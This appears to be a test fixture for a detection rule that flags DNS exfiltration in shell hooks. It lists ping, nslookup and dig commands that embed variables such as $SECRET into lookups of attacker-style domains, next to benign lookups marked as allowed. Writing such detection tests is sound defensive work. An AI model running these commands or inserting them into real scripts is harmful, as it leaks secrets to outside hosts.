#!/bin/bash

# ruleid: hooks-dns-exfiltration-generic
ping -c 1 $SECRET.attacker.com

# ruleid: hooks-dns-exfiltration-generic
nslookup $DATA.evil.com

# ruleid: hooks-dns-exfiltration-generic
dig $EXFIL_DATA.example.com

# ok: hooks-dns-exfiltration-generic
ping -c 1 google.com

# ok: hooks-dns-exfiltration-generic
nslookup example.com

# ok: hooks-dns-exfiltration-generic
echo "Skipping proto regeneration ($MINUTES_AGO minutes ago)"
